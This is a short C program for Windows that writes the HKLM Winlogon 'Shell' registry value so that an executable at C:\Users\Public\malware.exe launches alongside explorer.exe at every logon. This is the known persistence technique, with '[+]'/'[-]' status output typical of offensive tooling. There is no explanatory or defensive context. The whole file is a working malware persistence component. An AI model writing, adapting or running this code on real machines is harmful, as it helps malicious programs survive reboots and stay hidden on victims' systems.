#include <windows.h>
#include <stdio.h>

int main() {
    HKEY hKey;
    LPCSTR path = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
    LPCSTR name = "Shell";
    LPCSTR exePath = "explorer.exe,C:\\Users\\Public\\malware.exe";

    LONG result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, path, 0, KEY_SET_VALUE, &hKey);
    if (result != ERROR_SUCCESS) {
        printf("[-] Failed to open key: %ld\n", result);
        return 1;
    }

    result = RegSetValueExA(hKey, name, 0, REG_SZ, (const BYTE*)exePath, strlen(exePath) + 1);
    if (result == ERROR_SUCCESS) {
        printf("[+] Registry key written successfully.\n");
    } else {
        printf("[-] Failed to write key: %ld\n", result);
    }

    RegCloseKey(hKey);
    return 0;
}
